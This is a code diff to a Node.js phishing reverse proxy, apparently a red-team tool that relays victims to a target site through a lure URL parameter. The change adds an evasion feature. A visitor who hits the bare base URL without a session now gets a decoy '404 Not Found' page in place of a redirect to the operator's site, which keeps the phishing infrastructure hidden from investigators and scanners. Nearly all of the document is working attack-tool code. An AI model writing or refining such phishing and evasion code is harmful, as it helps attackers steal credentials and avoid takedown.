@@ -67,7 +67,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    else if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
@@ -289,8 +289,23 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
 
     else {
-        clientResponse.writeHead(301, { Location: REDIRECT_URL });
-        clientResponse.end();
+        // If someone visits the base URL without a session, show a 404 instead of redirecting to intrinsec
+        if (url === '/' && !currentSession) {
+            clientResponse.writeHead(404, { "Content-Type": "text/html" });
+            clientResponse.end(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>404 Not Found</title></head>
+                <body>
+                    <h1>404 Not Found</h1>
+                    <p>The requested page could not be found.</p>
+                </body>
+                </html>
+            `);
+        } else {
+            clientResponse.writeHead(301, { Location: REDIRECT_URL });
+            clientResponse.end();
+        }
     }
 });
 proxyServer.listen(process.env.PORT ?? 3000);
